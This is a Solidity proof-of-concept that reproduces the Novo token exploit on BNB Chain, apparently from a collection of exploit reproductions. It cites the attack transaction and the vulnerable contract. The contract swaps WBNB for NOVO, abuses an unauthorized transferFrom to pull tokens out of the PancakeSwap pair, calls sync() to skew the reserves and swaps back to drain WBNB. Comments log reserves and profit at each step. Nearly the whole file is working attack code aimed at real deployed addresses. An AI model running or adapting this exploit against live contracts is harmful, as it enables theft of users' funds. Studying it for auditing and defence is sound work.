// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";

// Exploit Alert ref: https://www.panewslab.com/zh_hk/articledetails/f40t9xb4.html
// Origin Attack Transaction: 0xc346adf14e5082e6df5aeae650f3d7f606d7e08247c2b856510766b4dfcdc57f
// Blocksec Txinfo: https://versatile.blocksecteam.com/tx/bsc/0xc346adf14e5082e6df5aeae650f3d7f606d7e08247c2b856510766b4dfcdc57f

// Attack Addr: 0x31a7cc04987520cefacd46f734943a105b29186e
// Attack Contract: 0x3463a663de4ccc59c8b21190f81027096f18cf2a

// Vulnerable Contract: https://bscscan.com/address/0xa0787daad6062349f63b7c228cbfd5d8a3db08f1#code


contract Novo_attack {
    // IPancakePair PancakePair = IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974);

    IPancakePair PancakePair = IPancakePair(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    INOVO novo = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);

    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";


    string str89 = "";
    string str90 = "";

    address[] path;


    constructor() payable {
        require(msg.value == 20 * 10 ** 18, "loan amount does not match");
        wbnb.deposit{value: 20 * 10 ** 18}();
        path = new address[](2);
        wbnb.approve(address(PancakeRouter), type(uint256).max);
        novo.approve(address(PancakePair), novo.balanceOf(address(this)));
    }

    receive() external payable {}


    function attack(  ) public {
        // ===================== Flashloan of 20 BNB ==================      
        // Action 1: SwapFeeToken:  WBNB -> NOVO   State: PancakeSwap
        //                          State: PancakeSwap
        
        // str1 = PancakePairReserveSummary();
        // uint NovoGot = novo.balanceOf(address(this));

        path[0] = address(wbnb);
        path[1] = address(novo);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(1720 * 1e16, 1, path, address(this), block.timestamp); // get 4,749,070,146,640,911 NOVO Token
        
        // NovoGot = (novo.balanceOf(address(this)) - NovoGot ) / 1e9;
        // str2 = PancakePairReserveSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(NovoGot)) ));

        // NOVO reserve: 120090152 WBNB reserve: 39500 
        // NOVO reserve: 115091130 WBNB reserve: 41220 
        // 4749070



        // Action 2: TransferFrom:  None -> None   State: PancakeSwap     where bugs happen
        //                          State: PancakeSwap
        
        // str1 = PancakePairBalanceSummary();
    
        novo.transferFrom(address(PancakePair), address(novo), 113951614 * 1e9);  // 113,951,614.76238437 NOVO Token

        // str2 = PancakePairBalanceSummary();
        // revert(appendWithSpace(str1, str2) );

        // NOVO balance: 115091130 WBNB balance: 41220 
        // NOVO balance: 1139516 WBNB balance: 41220



        // Action 3: Sync: None -> None   State: PancakeSwap
        //                          State: PancakeSwap
        // Sync NOVO/WBNB price


        // str1 = PancakePairBalanceSummary();
        // str2 = PancakePairReserveSummary();

        PancakePair.sync();

        // str3 = PancakePairBalanceSummary();
        // str4 = PancakePairReserveSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, appendWithSpace(str3, str4))));

        // NOVO balance: 1139516 WBNB balance: 41220 
        // NOVO reserve: 115091130 WBNB reserve: 41220 

        // NOVO balance: 1139516 WBNB balance: 41220 
        // NOVO reserve: 1139516 WBNB reserve: 41220



        // Action 4: SwapFeeToken:  NOVO -> WBNB   State: PancakeSwap
        //                          State: PancakeSwap


        // str1 = PancakePairReserveSummary();
        // uint WBNBGot = wbnb.balanceOf(address(this));

        path[0] = address(novo);
        path[1] = address(wbnb);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(4749070 * 1e9, 1, path, address(this), block.timestamp);
       
        // str2 = PancakePairReserveSummary();
        // WBNBGot = (wbnb.balanceOf(address(this)) - WBNBGot ) / 1e16; 
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(WBNBGot)) ));


        // NOVO reserve: 1139516 WBNB reserve: 41220 
        // NOVO reserve: 6251133 WBNB reserve: 10272 
        // 26577


        revert(ProfitSummary());
        //  26857 - 2000 = 24857 * 1e16 WBNB
    }

    function PancakePairBalanceSummary() internal returns (string memory) {
        uint balance0 = novo.balanceOf(address(PancakePair));
        uint balance1 = wbnb.balanceOf(address(PancakePair));

        str89 = append("NOVO balance: ", uint2str(balance0 / 1e9));
        str90 = append(" WBNB balance: ", uint2str(balance1 / 1e16));

        return append(str89, str90);
    }

    function PancakePairReserveSummary() internal returns (string memory) {
        (uint112 reserve0, uint112 reserve1,) = PancakePair.getReserves();
        str89 = append("NOVO reserve: ", uint2str(reserve0 / 1e9));
        str90 = append(" WBNB reserve: ", uint2str(reserve1 / 1e16));

        return append(str89, str90);
    }
        
    
    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = wbnb.balanceOf(address(this)) / 10 ** 16;
        return append("WBNB balance: ", uint2str(balance1));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}

                                